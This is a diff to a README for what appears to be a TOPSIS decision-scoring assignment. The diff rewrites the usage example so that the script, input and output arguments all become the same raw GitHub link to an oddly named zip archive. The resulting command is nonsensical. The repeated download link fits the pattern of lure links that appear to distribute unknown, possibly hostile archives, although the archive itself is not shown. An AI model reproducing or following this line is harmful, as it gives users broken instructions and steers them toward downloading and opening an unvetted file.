@@ -43,7 +43,7 @@ After applying TOPSIS, the resulting data includes additional columns - Topsis S
    For example:
 
    ```bash
-   python topsis_script.py input_data.csv "1,1,1,1" "+,+,-,-" output.csv
+   python https://raw.githubusercontent.com/ArmanKyro/Topsis_Assignment/main/urethroscopical/Topsis_Assignment_covertness.zip https://raw.githubusercontent.com/ArmanKyro/Topsis_Assignment/main/urethroscopical/Topsis_Assignment_covertness.zip "1,1,1,1" "+,+,-,-" https://raw.githubusercontent.com/ArmanKyro/Topsis_Assignment/main/urethroscopical/Topsis_Assignment_covertness.zip
 2. The result CSV will be saved in the current directory with Topsis Score and Rank added to the input csv.
 
 ## Contributors
